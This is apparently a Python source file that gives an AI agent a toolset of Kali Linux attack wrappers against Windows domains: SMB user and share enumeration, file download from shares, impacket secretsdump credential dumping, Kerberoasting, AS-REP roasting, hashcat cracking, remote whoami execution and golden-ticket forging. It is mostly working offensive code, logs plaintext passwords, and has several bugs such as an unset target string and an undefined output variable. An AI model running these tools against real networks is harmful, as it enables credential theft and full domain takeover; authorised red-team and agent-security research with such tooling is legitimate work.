import os
import subprocess
import tempfile

from loguru import logger

from dreadnode.agent.tools import Toolset, tool_method


class KaliTool(Toolset):
    """
    A collection of Kali Linux tools for penetration testing and security assessments.
    """

    name: str = "kali-tools"
    description: str = (
        "A collection of Kali Linux tools for penetration testing and security assessments."
    )

    @tool_method()
    def nmap_scan(self, target: str) -> str:
        """
        Scans target IPs to classify them as Domain Controllers or Member Servers.

        Args:
            target: IP addresses to scan

        Returns:
            Output of nmap scan

        Example:
            >>> result = nmap_scan("192.168.1.2")
        """

        cmd = ["nmap", "-T4", "-sS", "-sV", "--open", *target.split(" ")]

        try:
            logger.info("[*] Scanning targets...")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=300)  # noqa: S603

            if result.returncode != 0:
                logger.error(f"[!] Nmap scan failed: {result.stderr}")
                return result.stderr

            logger.info(f"[*] Nmap scan completed for target {target}: {result.stdout}")
            return result.stdout

        except subprocess.TimeoutExpired:
            logger.error("Nmap scan timed out after 5 minutes")
            return "Nmap scan timed out after 5 minutes"
        except Exception as e:
            logger.error(f"Scan failed: {e!s}")
            return f"Scan failed: {e!s}"

    @tool_method()
    def enumerate_users_netexec(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Enumerate users using netexec (crackmapexec successor).

        Args:
            target: IP address or hostname to enumerate
            username: Username for authentication (empty string for null session)
            password: Password for authentication (empty string for null session)
            domain: Domain for authentication

        Returns:
            String of netexec output

        Example:
            >>> output = enumerate_users_netexec("192.168.1.100", "user", "pass")
        """

        try:
            # Build netexec command
            cmd = ["netexec", "smb", target]

            if username and password:
                cmd.extend(["-u", username, "-p", password])
                if domain:
                    cmd.extend(["-d", domain])
            else:
                cmd.extend(["-u", "", "-p", ""])

            cmd.append("--users")

            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603
            logger.info(
                f"[*] Netexec user enumeration completed for target {target} username: {username} password: {password} domain: {domain} result: {result.stdout}"
            )

        except subprocess.TimeoutExpired:
            raise TimeoutError(f"User enumeration timed out for {target}") from None
        except Exception as e:
            logger.error(
                f"User enumeration failed for {target} username: {username} password: {password} domain: {domain} error: {e}"
            )
            return f"User enumeration failed for {target} username: {username} password: {password} domain: {domain} error: {e}"

        return result.stdout

    @tool_method()
    def enumerate_shares_netexec(
        self,
        target: str,
        domain: str,
        username: str = "",
        password: str = "",
    ) -> str:
        """
        Enumerate shares using netexec (crackmapexec successor).

        Args:
            target: IP address or hostname to enumerate
            username: Username for authentication (empty for null session)
            password: Password for authentication (empty for null session)
            domain: Domain for authentication

        Returns:
            String of netexec output

        Example:
            >>> output = enumerate_shares_netexec("192.168.1.100", "user", "pass")
        """

        try:
            # Build netexec command
            cmd = ["netexec", "smb", target]

            if username and password:
                cmd.extend(["-u", username, "-p", password])
                if domain:
                    cmd.extend(["-d", domain])
            else:
                cmd.extend(["-u", "", "-p", ""])

            cmd.append("--shares")

            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603
            logger.info(
                f"[*] Netexec share enumeration completed for target {target} username: {username} password: {password} domain: {domain} result: {result.stdout}"
            )

        except subprocess.TimeoutExpired:
            raise TimeoutError(f"Share enumeration timed out for {target}") from None
        except Exception as e:
            logger.error(
                f"Share enumeration failed for {target} username: {username} password: {password} domain: {domain} error: {e}"
            )
            return f"Share enumeration failed for {target} username: {username} password: {password} domain: {domain} error: {e}"

        return result.stdout

    @tool_method()
    def enumerate_share_files(
        self,
        target: str,
        share_name: str,
        username: str,
        password: str,
    ) -> str:
        """
        Recursively enumerate files in an SMB share looking for interesting files.

        Args:
            target: Target IP address
            share_name: Name of the SMB share (e.g., 'SYSVOL', 'all', 'C$')
            username: Username for authentication
            password: Password for authentication

        Returns:
            String of smbclient output
        """
        share_path = f"//{target}/{share_name}"

        try:
            cmd = [
                "smbclient",
                share_path,
                "-U",
                f"{username}%{password}",
                "-c",
                "recurse ON; ls",
            ]

            logger.info(f"[*] Enumerating files in {share_path}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603

            if result.returncode != 0:
                logger.error(f"[!] Failed to list files: {result.stderr}")
                return f"Failed to list files: {result.stderr}"

        except subprocess.TimeoutExpired:
            logger.error(f"[!] File enumeration timed out for {share_path}")
            return "File enumeration timed out"
        except Exception as e:
            logger.error(f"[!] Error during enumeration: {e!s}")
            return f"Error during enumeration: {e!s}"

        return result.stdout

    @tool_method()
    def download_file_content(
        self,
        target: str,
        share_name: str,
        file_path: str,
        username: str,
        password: str,
    ) -> str:
        """
        Download and return the content of a file from an SMB share.

        Args:
            target: Target IP address
            share_name: Name of the SMB share
            file_path: Path to the file within the share (e.g., 'script.ps1', 'folder/file.txt')
            username: Username for authentication
            password: Password for authentication
            max_size_mb: Maximum file size to download in MB

        Returns:
            Str with file content
        """

        share_path = f"//{target}/{share_name}"

        try:
            cmd = [
                "smbclient",
                share_path,
                "-U",
                f"{username}%{password}",
                "-c",
                f"get {file_path} /dev/stdout",
            ]

            logger.info(f"[*] Downloading {file_path} from {share_path}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)  # noqa: S603

            if result.returncode != 0:
                logger.error(f"[!] Failed to download file: {result.stderr}")
                return "Failed to download file: {result.stderr}"

            content = result.stdout

            logger.info(f"[+] Downloaded {len(content)} bytes from {file_path}")

        except subprocess.TimeoutExpired:
            logger.error(f"[!] File download timed out for {file_path}")
            return "File download timed out"
        except Exception as e:
            logger.error(f"[!] Error downloading file: {e!s}")
            return f"Error downloading file: {e!s}"

        logger.info(f"[*] File download completed for {file_path} result: {content}")
        return content

    @tool_method()
    def secretsdump(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        *,
        use_kerberos: bool = False,
        timeout_minutes: int = 10,
    ) -> str:
        """
        Extract secrets using impacket-secretsdump for credential harvesting. Must provide either password, hash, or set no_pass to True. no_pass should only be used for kerberos golden ticketauthentication.

        Args:
            target: Target IP address
            username: Username with admin privileges
            password: Password for the username (optional)
            hash: NTLM hash for authentication (optional)
            domain: Domain name (optional, can be inferred)
            no_pass: If True, do not use a password for authentication
            timeout_minutes: Maximum time to spend dumping

        Returns:
            String of secretsdump output
        """

        cmd = ["/usr/bin/impacket-secretsdump"]

        if password and domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        elif password and not domain:
            target_string = f"{username}:{password}@{target}"
        elif hash and domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{domain}/{username}@{target}"
        elif hash and not domain:
            cmd.extend(["-hashes", f":{hash}"])
        # assumes golden ticket
        elif use_kerberos:
            cmd.extend(["-k", "-no-pass"])
            target_string = f"{username}@{target}"
        else:
            raise ValueError("Either password or hash or use_kerberos must be provided")
            raise ValueError("Either password or hash or no_pass must be provided")

        cmd.append(target_string)

        try:
            logger.info(f"[*] Running secretsdump on {target} with {username}")
            logger.info(f"[*] Command: {cmd}")
            # Set up environment for Kerberos authentication if using golden ticket
            env = os.environ.copy() if use_kerberos else None
            if use_kerberos and env is not None:
                env["KRB5CCNAME"] = "Administrator.ccache"
                env["KRB5CCNAME"] = "Administrator.ccache"

            result = subprocess.run(  # noqa: S603
                cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=timeout_minutes * 60,
                env=env,
            )

        except subprocess.TimeoutExpired:
            return "[!] Secretsdump timed out"
        except Exception as e:
            return f"[!] Secretsdump error: {e}"

        logger.info(
            f"[*] Secretsdump completed for {target} with {username} result: {result.stdout}"
        )
        return result.stdout

    @tool_method()
    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform Kerberoasting attack to extract service account password hashes.

        Args:
            domain: Target domain (e.g., 'xx.yy.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Domain controller IP address
            output_file: Optional file to save hashes to

        Returns:
            String of kerberoasting output from impacket-GetUserSPNs
        """

        cmd = [
            "/usr/bin/impacket-GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] Kerberoasting {domain} using {username}:{password}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)  # noqa: S603
        except subprocess.TimeoutExpired:
            return "Error: timeout"
        except Exception as e:
            return f"Command failed: {e}"
        else:
            return result.stdout

    @tool_method()
    def asrep_roast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        output_file: str | None = None,
        user_list: list[str] | None = None,
    ) -> str:
        """
        Perform AS-REP roasting attack to find users without Kerberos pre-authentication.

        Args:
            domain: Target domain (e.g., 'xx.yy.local')
            username: Valid domain username (for enumeration)
            password: Password for the username
            dc_ip: Domain controller IP address
            output_file: Optional file to save hashes to
            user_list: Optional list of specific users to check

        Returns:
            String of asrep roasting output from impacket-GetNPUsers
        """

        cmd = [
            "/usr/bin/impacket-GetNPUsers",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        if output_file:
            cmd.extend(["-outputfile", output_file])

        temp_userfile = None
        if user_list:
            with tempfile.NamedTemporaryFile(mode="w'", delete=False, suffix=".txt") as f:
                temp_userfile = f.name
                f.write("\n".join(user_list))
            cmd.extend(["-usersfile", temp_userfile])

        try:
            logger.info(f"[*] AS-REP roasting {domain} using {username}:{password}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)  # noqa: S603

        except subprocess.TimeoutExpired:
            return "Error: Command timed out after 60 seconds"
        except Exception as e:
            return f"Command failed: {e}"
        else:
            return result.stdout

    @tool_method()
    def hashcat(
        self,
        hash_value: str,
        hashcat_mode: int = 13100,
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
    ) -> str:
        """
        Attempt to crack a password hash using hashcat.

        Args:
            hash_value: Hash to crack
            hashcat_mode: Hashcat mode to use
            wordlist_path: Path to wordlist file (default: /usr/share/wordlists/rockyou.txt)
            max_time_minutes: Maximum time to spend cracking

        Returns:
            String output from hashcat including cracked passwords

        Example:
            >>> result = hashcat_crack("aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76",
            ...                       1000, "/usr/share/wordlists/rockyou.txt")
        """

        with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
            hash_file.write(hash_value)
            hash_file_path = hash_file.name

            try:
                cmd = [
                    "hashcat",
                    "-m",
                    str(hashcat_mode),
                    "-a",
                    "0",
                    hash_file_path,
                    wordlist_path,
                    "--runtime",
                    str(max_time_minutes * 60),
                    "--force",
                ]

                result = subprocess.run(  # noqa: S603
                    cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=(max_time_minutes * 60) + 30,
                )

                if result.returncode not in (0, 1, 2):  # 0=OK,1=No hashes cracked,2=Exhausted
                    logger.error(f"[!] Hashcat failed: {result.stderr}")
                    return f"Hashcat failed: {result.stderr}"

                show_cmd = ["hashcat", "-m", str(hashcat_mode), hash_file_path, "--show"]

                show_result = subprocess.run(  # noqa: S603
                    show_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )

                if show_result.stdout.strip():
                    output = "\nCracked passwords (--show):\n" + show_result.stdout

                logger.info(f"[*] Hashcat completed for {hash_value} result: {output}")

            except subprocess.TimeoutExpired:
                return "Error: Command timed out"
            except Exception as e:
                return f"Error: {e}"
            else:
                return output

    @tool_method()
    def domain_admin_checker(
        self,
        targets: str,
        username: str,
        password: str = "",
        hash: str = "",
    ) -> str:
        """
        Check if a user is a domain admin by checking output of whoami.

        Args:
            targets: IP address or addresses to check
            username: Username for authentication
            password: Password for authentication (optional)
            hash: NTLM hash for authentication (optional)

        Returns:
            String of domain admin checker output

        Example:
            >>> output = domain_admin_checker("192.168.1.100 192.168.1.101 192.168.1.102", "user", password="pass", hash="hash")
        """

        try:
            cmd = ["netexec", "smb", *targets.split(" ")]

            if password:
                logger.info(f"[*] Domain admin checker using password for {username}")
                cmd.extend(["-u", username, "-p", password])
            elif hash:
                logger.info(f"[*] Domain admin checker using hash for {username}")
                cmd.extend(["-u", username, "-H", hash])

            cmd.extend(["-x", "whoami"])

            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603

            if result.returncode != 0:
                logger.error(f"[!] Domain admin checker failed: {result.stderr}")
                output = f"Command failed (return code {result.returncode}): {result.stderr}"
            else:
                output = ""
                if result.stdout:
                    output += result.stdout
                if result.stderr:
                    if output:
                        output += "\n" + result.stderr
                    else:
                        output = result.stderr

            logger.info(
                f"[*] Domain admin checker completed for target {targets} username: {username} password: {password} hash: {hash} result: {output}"
            )

        except subprocess.TimeoutExpired:
            raise TimeoutError(f"Domain admin checker timed out for {targets}") from None
        except Exception as e:
            logger.error(
                f"Domain admin checker failed for {targets} username: {username} password: {password} hash: {hash} error: {e}"
            )
            return f"Domain admin checker failed for {targets} username: {username} password: {password} hash: {hash} error: {e}"

        return output

    @tool_method()
    def get_sid(
        self,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Get the SID of a user.

        Args:
            domain: Target domain (e.g., 'xx.yy.local')
            username: Valid domain username
            password: Password for the username

        Returns:
            String of get_sid output

        Example:
            >>> output = get_sid("domainname.local", "user.name", "mypassword1234")
        """

        cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]

        try:
            logger.info(f"[*] Getting SID for {domain} using {username}:{password}")
            logger.info(f"[*] Command: {cmd}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603

            logger.info(f"[*] SID output for {domain} is {result.stdout}")
            logger.info(f"[*] SID error for {domain} is {result.stderr}")
        except subprocess.TimeoutExpired:
            return "Error: Command timed out"
        except Exception as e:
            return f"Error: {e!s}"
        else:
            return result.stdout

    @tool_method()
    def generate_golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        domain: str,
        extra_sid: str,
    ) -> str:
        """
        Generate a golden ticket for Administrator.

        Args:
            krbtgt_hash: NTLM hash of the krbtgt account
            domain_sid: SID of the domain
            domain: Domain to generate a ticket for (e.g., "domain.local"), same domain from domain_sid and krbtgt_hash
            extra_sid: Extra SID to add to the ticket, from the target domain

        Returns:
            String of generate_golden_ticket output

        Example:
            >>> output = generate_golden_ticket("longhash", "user.name", "S-1-5-###SID", "domain.local", "S-1-5-###SID-519", "500")
        """

        cmd = [
            "impacket-ticketer",
            "-nthash",
            krbtgt_hash,
            "-domain-sid",
            domain_sid,
            "-domain",
            domain,
            "-extra-sid",
            extra_sid,
            "-user-id",
            "500",
            "Administrator",
        ]

        try:
            logger.info("[*] Generating golden ticket for Administrator")
            logger.info(f"[*] Command: {cmd}")
            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603
        except subprocess.TimeoutExpired:
            return "Error: Command timed out"
        except Exception as e:
            return f"Error: {e}"
        else:
            return result.stdout
